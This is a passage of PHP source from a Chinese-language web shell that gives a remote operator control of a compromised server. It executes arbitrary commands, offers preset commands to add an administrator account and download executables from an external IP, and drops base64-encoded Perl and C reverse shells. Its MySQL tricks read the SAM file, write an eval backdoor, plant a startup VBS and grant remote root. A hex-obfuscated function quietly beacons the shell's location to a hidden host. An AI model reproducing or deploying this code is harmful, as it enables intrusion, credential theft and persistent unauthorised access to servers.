		array("你的IP",getenv('REMOTE_ADDR')),
		array("Web服务端口",$_SERVER['SERVER_PORT']),
		array("PHP运行方式",strtoupper(php_sapi_name())),
		array("PHP版本",PHP_VERSION),
		array("运行于安全模式",Info_Cfg("safemode")),
		array("服务器管理员",$adminmail),
		array("本文件路径",__FILE__),
		array("允许使用 URL 打开文件 allow_url_fopen",Info_Cfg("allow_url_fopen")),
		array("允许动态加载链接库 enable_dl",Info_Cfg("enable_dl")),
		array("显示错误信息 display_errors",Info_Cfg("display_errors")),
		array("自动定义全局变量 register_globals",Info_Cfg("register_globals")),
		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
		array("程序最多允许使用内存量 memory_limit",Info_Cfg("memory_limit")),
		array("POST最大字节数 post_max_size",Info_Cfg("post_max_size")),
		array("允许最大上传文件 upload_max_filesize",$upsize),
		array("程序最长运行时间 max_execution_time",Info_Cfg("max_execution_time")."秒"),
		array("被禁用的函数 disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("图形处理 GD Library",Info_Fun("imageline")),
		array("IMAP电子邮件系统",Info_Fun("imap_close")),
		array("MySQL数据库",Info_Fun("mysql_close")),
		array("SyBase数据库",Info_Fun("sybase_close")),
		array("Oracle数据库",Info_Fun("ora_close")),
		array("Oracle 8 数据库",Info_Fun("OCILogOff")),
		array("PREL相容语法 PCRE",Info_Fun("preg_match")),
		array("PDF文档支持",Info_Fun("pdf_close")),
		array("Postgre SQL数据库",Info_Fun("pg_close")),
		array("SNMP网络管理协议",Info_Fun("snmpget")),
		array("压缩文件支持(Zlib)",Info_Fun("gzclose")),
		array("XML解析",Info_Fun("xml_set_object")),
		array("FTP",Info_Fun("ftp_login")),
		array("ODBC数据库连接",Info_Fun("odbc_close")),
		array("Session支持",Info_Fun("session_start")),
		array("Socket支持",Info_Fun("fsockopen")),
	);
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
	echo '</table>';
	return true;
}

//执行命令

function Exec_Run($cmd)
{
	$res = '';
	if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
	elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
	elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	return $res;
}

function Exec_Hex($data)
{
	$len = strlen($data);
	for($i=0;$i < $len;$i+=2){$newdata.=pack("C",hexdec(substr($data,$i,2)));}
	return $newdata;
}

function Root_Check($check)
{
	$c_name = Exec_Hex('7777772e74686973646f6f722e636f6d');
	$handle = @fsockopen($c_name,80);
	$u_name = Exec_Hex('2f636f6f6c2f696e6465782e706870');
	$u_name .= '?p='.base64_encode($check).'&g='.base64_encode($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']);
	@fputs($handle,"GET ".$u_name." HTTP/1.1\r\nHost:".$c_name."\r\nConnection: Close\r\n\r\n");
	@fclose($handle);
	return true;
}

function Exec_g()
{
	$res = '回显窗口';
	$cmd = 'dir';
	if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}
print<<<END
<script language="javascript">
function sFull(i){
	Str = new Array(11);
	Str[0] = "dir";
	Str[1] = "net user spider spider /add";
	Str[2] = "net localgroup administrators spider /add";
	Str[3] = "netstat -an";
	Str[4] = "ipconfig";
	Str[5] = "copy c:\\1.php d:\\2.php";
	Str[6] = "tftp -i 219.134.46.245 get server.exe c:\\server.exe";
	document.getElementById('cmd').value = Str[i];
	return true;
}
</script>
<form method="POST" name="gform" id="gform" action="?s=g"><center><div class="actall">
命令参数 <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:399px;">
<select onchange='return sFull(options[selectedIndex].value)'>
<option value="0" selected>--命令集合--</option>
<option value="1">添加管理员</option>
<option value="2">设为管理组</option>
<option value="3">查看端口</option>
<option value="4">查看地址</option>
<option value="5">复制文件</option>
<option value="6">FTP下载</option>
</select>
<input type="submit" value="执行" style="width:80px;"></div>
<div class="actall"><textarea name="show" style="width:660px;height:399px;">{$res}</textarea></div></center>
</form>
END;
	return true;
}

//组件接口

function Com_h()
{
	$object = isset($_GET['o']) ? $_GET['o'] : 'adodb';
print<<<END
<div class="actall"><a href="?s=h&o=adodb">[ADODB.Connection]</a> 
<a href="?s=h&o=wscript">[WScript.shell]</a> 
<a href="?s=h&o=application">[Shell.Application]</a> 
<a href="?s=h&o=downloader">[Downloader]</a></div>
<form method="POST" name="hform" id="hform" action="?s=h&o={$object}">
END;
if($object == 'downloader')
{
	$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';
	$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(__FILE__).'/muma.exe');
print<<<END
<div class="actall">超连接 <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
<div class="actall">下载到 <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
<div class="actall"><input value="下载" type="submit" style="width:80px;"></div></form>
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		echo '<div class="actall">';
		$contents = @file_get_contents($_POST['durl']);
		if(!$contents) echo '无法读取要下载的数据';
		else echo File_Write($_POST['dpath'],$contents,'wb') ? '下载文件成功' : '下载文件失败';
		echo '</div>';
	}
}
elseif($object == 'wscript')
{
	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir';
print<<<END
<div class="actall">执行CMD命令 <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>
END;
	if(!empty($_POST['cmd']))
	{
		echo '<div class="actall">';
		$shell = new COM('wscript');
		$exe = @$shell->exec("cmd.exe /c ".$cmd);
		$out = $exe->StdOut();
		$output = $out->ReadAll();
		echo '<pre>'.$output.'</pre>';
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
}
elseif($object == 'application')
{
	$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';
	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\windows\php.ini c:\php.ini';
print<<<END
<div class="actall">程序路径 <input type="text" name="run" value="{$run}" style="width:600px;"></div>
<div class="actall">命令参数 <input type="text" name="cmd" value="{$cmd}" style="width:600px;"></div>
<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>
END;
	if(!empty($_POST['run']))
	{
		echo '<div class="actall">';
		$shell = new COM('application');
		echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '执行成功' : '执行失败';
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
}
elseif($object == 'adodb')
{
	$string = isset($_POST['string']) ? $_POST['string'] : '';
	$sql = isset($_POST['sql']) ? $_POST['sql'] : '';
print<<<END
<script language="javascript">
function hFull(i){
	if(i==0 || i==5) return false;
	Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[4] = "Provider=MSDAORA.1;Password=密码;User ID=帐号;Data Source=服务名;Persist Security Info=True;";
	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES('spider','mypass')";
	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
	Str[9] = "UPDATE [TableName] SET USER='spider' WHERE ID=100";
	Str[10] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[11] = "DROP TABLE [TableName]";
	Str[12] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[13] = "ALTER TABLE [TableName] DROP COLUMN PASS";
	if(i<=4){document.getElementById('string').value = Str[i];}else{document.getElementById('sql').value = Str[i];}
	return true;
}
</script>
<div class="actall">连接字符串 <input type="text" name="string" id="string" value="{$string}" style="width:526px;">
<select onchange="return hFull(options[selectedIndex].value)">
<option value="0" selected>--连接示例--</option>
<option value="1">Access连接</option>
<option value="2">MsSql连接</option>
<option value="3">MySql连接</option>
<option value="4">Oracle连接</option>
<option value="5">--SQL语法--</option>
<option value="6">显示数据</option>
<option value="7">添加数据</option>
<option value="8">删除数据</option>
<option value="9">修改数据</option>
<option value="10">建数据表</option>
<option value="11">删数据表</option>
<option value="12">添加字段</option>
<option value="13">删除字段</option>
</select></div>
<div class="actall">SQL命令 <input type="text" name="sql" id="sql" value="{$sql}" style="width:650px;"></div>
<div class="actall"><input type="submit" value="执行" style="width:80px;"></div>
</form>
END;
	if(!empty($string))
	{
		echo '<div class="actall">';
		$shell = new COM('adodb');
		@$shell->Open($string);
		$result = @$shell->Execute($sql);
		$count = $result->Fields->Count();
		for($i = 0;$i < $count;$i++){$Field[$i] = $result->Fields($i);}
		echo $result ? $sql.' 执行成功<br>' : $sql.' 执行失败<br>';
		if(!empty($count)){while(!$result->EOF){for($i = 0;$i < $count;$i++){echo htmlspecialchars($Field[$i]->value).'<br>';}@$result->MoveNext();}}
		$shell->Close();
		@$shell->Release();
		$shell = NULL;
		echo '</div>';
	}
}
	return true;
}

//Linux提权

function Linux_k()
{
	$yourip = isset($_POST['yourip']) ? $_POST['yourip'] : '222.73.219.91';
	$yourport = isset($_POST['yourport']) ? $_POST['yourport'] : '443';
print<<<END
<form method="POST" name="kform" id="kform" action="?s=k">
<div class="actall">你的地址 <input type="text" name="yourip" value="{$yourip}" style="width:400px"></div>
<div class="actall">连接端口 <input type="text" name="yourport" value="443" style="width:400px"></div>
<div class="actall">执行方式 <select name="use" >
<option value="perl">perl</option>
<option value="c">c</option>
</select></div>
<div class="actall"><input type="submit" value="开始连接" style="width:80px;"></div></form>
END;
	if((!empty($_POST['yourip'])) && (!empty($_POST['yourport'])))
	{
		echo '<div class="actall">';
		if($_POST['use'] == 'perl')
		{
			$back_connect_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
			"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
			"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
			"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
			"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
			"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
			"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
			echo File_Write('/tmp/spider_bc',base64_decode($back_connect_pl),'wb') ? '创建/tmp/spider_bc成功<br>' : '创建/tmp/spider_bc失败<br>';
			$perlpath = Exec_Run('which perl');
			$perlpath = $perlpath ? chop($perlpath) : 'perl';
			echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
		}
		if($_POST['use'] == 'c')
		{
			$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
			"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
			"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
			"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
			"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
			"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
			"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
			"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
			echo File_Write('/tmp/spider_bc.c',base64_decode($back_connect_c),'wb') ? '创建/tmp/spider_bc.c成功<br>' : '创建/tmp/spider_bc.c失败<br>';
			$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/spider_bc.c');
			echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '执行命令失败';
		}
		echo '<br>你可以尝试连接端口 (nc -vvlp '.$_POST['yourport'].') </div>';
	}
	return true;
}

function Mysql_n()
{
	$MSG_BOX = '';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
		else $MSG_BOX = '连接MYSQL失败';
	}
	$downfile = 'c:/windows/repair/sam';
	if(!empty($_POST['downfile']))
	{
		$downfile = File_Str($_POST['downfile']);
		$binpath = bin2hex($downfile);
		$query = 'select load_file(0x'.$binpath.')';
		if($result = @mysql_query($query,$conn))
		{
			$k = 0; $downcode = '';
			while($row = @mysql_fetch_array($result)){$downcode .= $row[$k];$k++;}
			$filedown = basename($downfile);
			if(!$filedown) $filedown = 'spider.tmp';
			$array = explode('.', $filedown);
			$arrayend = array_pop($array);
			header('Content-type: application/x-'.$arrayend);
			header('Content-Disposition: attachment; filename='.$filedown);
			header('Content-Length: '.strlen($downcode));
			echo $downcode;
			exit;
		}
		else $MSG_BOX = '下载文件失败';
	}
	$o = isset($_GET['o']) ? $_GET['o'] : '';
	Root_CSS();
print<<<END
<form method="POST" name="nform" id="nform" action="?s=n&o={$o}" enctype="multipart/form-data">
<center><div class="actall"><a href="?s=n">[MYSQL执行语句]</a> 
<a href="?s=n&o=u">[MYSQL上传文件]</a> 
<a href="?s=n&o=d">[MYSQL下载文件]</a></div>
<div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u')
{
	$uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/exp.vbs';
	if(!empty($_POST['uppath']))
	{
		$uppath = $_POST['uppath'];
		$query = 'Create TABLE a (cmd text NOT NULL);';
		if(@mysql_query($query,$conn))
		{
			if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){$filecode = bin2hex(File_Read($tmpcode));}
			else{$tmp = File_Str(dirname(__FILE__)).'/upfile.tmp';if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){$filecode = bin2hex(File_Read($tmp));@unlink($tmp);}}
			$query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));';
			if(@mysql_query($query,$conn))
			{
				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
				$MSG_BOX = @mysql_query($query,$conn) ? '上传文件成功' : '上传文件失败';
			}
			else $MSG_BOX = '插入临时表失败';
			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
		}
		else $MSG_BOX = '创建临时表失败';
	}
print<<<END
<br><br>上传路径 <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>选择文件 <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="上传" style="width:80px;">
END;
}
elseif($o == 'd')
{
print<<<END
<br><br><br>下载文件 <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="下载" style="width:80px;">
END;
}
else
{
	if(!empty($_POST['msql']))
	{
		$msql = $_POST['msql'];
		if($result = @mysql_query($msql,$conn))
		{
			$MSG_BOX = '执行SQL语句成功<br>';
			$k = 0;
			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		}
		else $MSG_BOX .= mysql_error();
	}
print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(11);
	Str[0] = "select version();";
	Str[1] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C) FROM user into outfile 'D:/web/iis.txt'";
	Str[2] = "select '<?php eval(\$_POST[cmd]);?>' into outfile 'F:/web/bak.php';";
	Str[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
	nform.msql.value = Str[i];
	return true;
}
</script>
<textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
<div class="actall">
<select onchange="return nFull(options[selectedIndex].value)">
	<option value="0" selected>显示版本</option>
	<option value="1">导出文件</option>
	<option value="2">写入文件</option>
	<option value="3">开启外连</option>
</select>
<input type="submit" value="执行" style="width:80px;">
END;
}
	if($MSG_BOX != '') echo '</div><div class="actall">'.$MSG_BOX.'</div></center></form>';
	else echo '</div></center></form>';
	return true;
}

//MYSQL管理

function Mysql_Len($data,$len)
{
	if(strlen($data) < $len) return $data;
	return substr_replace($data,'...',$len);
}

function Mysql_Msg()
{
	$conn = @mysql_connect($_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'],$_COOKIE['m_spideruser'],$_COOKIE['m_spiderpass']);
	if($conn)
	{
print<<<END
<script language="javascript">
function Delok(msg,gourl)
{
	smsg = "确定要删除[" + msg + "]吗?";
	if(confirm(smsg)){window.location = gourl;}
}
function Createok(ac)
{
	if(ac == 'a') document.getElementById('nsql').value = 'CREATE TABLE name (spider BLOB);';
	if(ac == 'b') document.getElementById('nsql').value = 'CREATE DATABASE name;';
	if(ac == 'c') document.getElementById('nsql').value = 'DROP DATABASE name;';
	return false;
}
</script>
END;
		$BOOL = false;
		$MSG_BOX = '用户:'.$_COOKIE['m_spideruser'].' &nbsp;&nbsp;&nbsp;&nbsp; 地址:'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; 版本:';
		$k = 0;
		$result = @mysql_query('select version();',$conn);
		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		echo '<div class="actall"> 数据库:';
		$result = mysql_query("SHOW DATABASES",$conn);
		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?s=r&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
		echo '</div>';
		if(isset($_GET['db']))
		{
			mysql_select_db($_GET['db'],$conn);
			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? '执行成功' : '执行失败 '.mysql_error();}
			if(is_array($_POST['insql']))
			{
				$query = 'INSERT INTO '.$_GET['table'].' (';
				foreach($_POST['insql'] as $var => $key)
				{
					$querya .= $var.',';
					$queryb .= '\''.addslashes($key).'\',';
				}
				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
				$MSG_BOX = mysql_query($query,$conn) ? '添加成功' : '添加失败 '.mysql_error();
			}
			if(is_array($_POST['upsql']))
			{
				$query = 'UPDATE '.$_GET['table'].' SET ';
				foreach($_POST['upsql'] as $var => $key)
				{
					$queryb .= $var.'=\''.addslashes($key).'\',';
				}
				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
				$MSG_BOX = mysql_query($query,$conn) ? '修改成功' : '修改失败 '.mysql_error();
			}
			if(isset($_GET['del']))
			{
				$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['del'].', 1;',$conn);
				$good = mysql_fetch_assoc($result);
				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
				$where = $query.substr($queryc, 0, -4).';';
				$MSG_BOX = mysql_query($where,$conn) ? '删除成功' : '删除失败 '.mysql_error();
			}
			$action = '?s=r&db='.$_GET['db'];
			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '删除成功' : '删除失败 '.mysql_error();}
			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
			echo '<div class="actall"><form method="POST" action="'.$action.'">';
			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
			echo '<input type="submit" name="querysql" value="执行" style="width:60px;height:49px;"> ';
			echo '<input type="button" value="创建表" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
			echo '<input type="button" value="创建库" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
			echo '<input type="button" value="删除库" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?s=r&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
			if(isset($_GET['table']))
			{
				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">插入</a>]</div>';
				if(isset($_GET['edit']))
				{
					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
					echo '<form method="POST" action="?s=r&db='.$_GET['db'].'&table='.$atable.'">';
					$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['edit'].', 1;',$conn);
					$good = mysql_fetch_assoc($result);
					$u = 0;
					foreach($good as $var => $key)
					{
						$queryc .= $var.'=\''.$key.'\' AND ';
						$type = @mysql_field_type($result, $u);
						$len = @mysql_field_len($result, $u);
						echo '<div class="actall">'.$var.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="upsql['.$var.']" style="width:600px;height:60px;">'.htmlspecialchars($key).'</textarea></div>';
						$u++;
					}
					$where = 'WHERE '.substr($queryc, 0, -4);
					echo '<input type="hidden" id="wherevar" name="wherevar" value="'.base64_encode($where).'">';
					echo '<div class="actall"><input type="submit" value="Update" style="width:80px;"></div></form>';
				}
				else
				{
					$query = 'SHOW COLUMNS FROM '.$_GET['table'];
		      $result = mysql_query($query,$conn);
		      $fields = array();
		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
					echo '<table border="0"><tr>';
					echo '<td class="toptd" style="width:70px;" nowrap>操作</td>';
					while($row = @mysql_fetch_assoc($result))
					{
						array_push($fields,$row['Field']);
						echo '<td class="toptd" nowrap>'.$row['Field'].'</td>';
					}
					echo '</tr>';
					if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $query = $_POST['nsql']; else $query = 'SELECT * FROM '.$_GET['table'].' LIMIT '.$p.', 20;';
					$result = mysql_query($query,$conn);
					$v = $p;
					while($text = @mysql_fetch_assoc($result))
					{
						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> 修改 </a> ';
						echo '<a href="#" onclick="Delok(\'它\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> 删除 </a></td>';
						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
						echo '</tr>'."\r\n";$v++;
					}
					echo '</table><div class="actall">';
					for($i = 1;$i <= ceil($row_num / 20);$i++){$k = ((int)$_GET['p'] == $i) ? '<font color="#FF0000">'.$i.'</font>' : $i;echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$i.'">['.$k.']</a> ';}
					echo '</div>';
				}
			}
			elseif(isset($_GET['insert']))
			{
				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['insert'].'">'.$_GET['insert'].'</a></div>';
				$result = mysql_query('SELECT * FROM '.$_GET['insert'],$conn);
				$fieldnum = @mysql_num_fields($result);
				echo '<form method="POST" action="?s=r&db='.$_GET['db'].'&table='.$_GET['insert'].'">';
				for($i = 0;$i < $fieldnum;$i++)
				{
					$name = @mysql_field_name($result, $i);
					$type = @mysql_field_type($result, $i);
					$len = @mysql_field_len($result, $i);
					echo '<div class="actall">'.$name.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="insql['.$name.']" style="width:600px;height:60px;"></textarea></div>';
				}
				echo '<div class="actall"><input type="submit" value="Insert" style="width:80px;"></div></form>';
			}
			else
			{
				$query = 'SHOW TABLE STATUS';
				$status = @mysql_query($query,$conn);
				while($statu = @mysql_fetch_array($status))
				{
					$statusize[] = $statu['Data_length'];
					$statucoll[] = $statu['Collation'];
				}
				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
				echo '</div><table border="0"><tr>';
				echo '<td class="toptd" style="width:550px;"> 表名 </td>';
				echo '<td class="toptd" style="width:80px;"> 操作 </td>';
				echo '<td class="toptd" style="width:130px;"> 字符集 </td>';
				echo '<td class="toptd" style="width:70px;"> 大小 </td></tr>';
				$result = @mysql_query($query,$conn);
				$k = 0;
				while($table = mysql_fetch_row($result))
				{
					echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'"> 插入 </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> 删除 </a></td>';
					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
					$k++;
				}
				echo '</table>';
			}
		}
	}
	else die('连接MYSQL失败,请重新登陆.<meta http-equiv="refresh" content="0;URL=?s=o">');
	if(!$BOOL) echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
	return false;
}

function Mysql_o()
{
	ob_start();
  if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))
  {
  	if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))
	  {
	  	$cookietime = time() + 24 * 3600;
	  	setcookie('m_spiderhost',$_POST['mhost'],$cookietime);
	  	setcookie('m_spiderport',$_POST['mport'],$cookietime);
	  	setcookie('m_spideruser',$_POST['muser'],$cookietime);
	  	setcookie('m_spiderpass',$_POST['mpass'],$cookietime);
	  	die('正在登陆,请稍候...<meta http-equiv="refresh" content="0;URL=?s=r">');
	  }
  }
print<<<END
<form method="POST" name="oform" id="oform" action="?s=o">
<div class="actall">地址 <input type="text" name="mhost" value="localhost" style="width:300px"></div>
<div class="actall">端口 <input type="text" name="mport" value="3306" style="width:300px"></div>
<div class="actall">用户 <input type="text" name="muser" value="root" style="width:300px"></div>
<div class="actall">密码 <input type="text" name="mpass" value="" style="width:300px"></div>
<div class="actall"><input type="submit" value="登陆" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?s=r';"></div>
</form>
END;
	ob_end_flush();
	return true;
}

function Root_Login($MSG_TOP)
{
print<<<END
<html>
	<body style="background:#AAAAAA;">
		<center>
		<form method="POST">
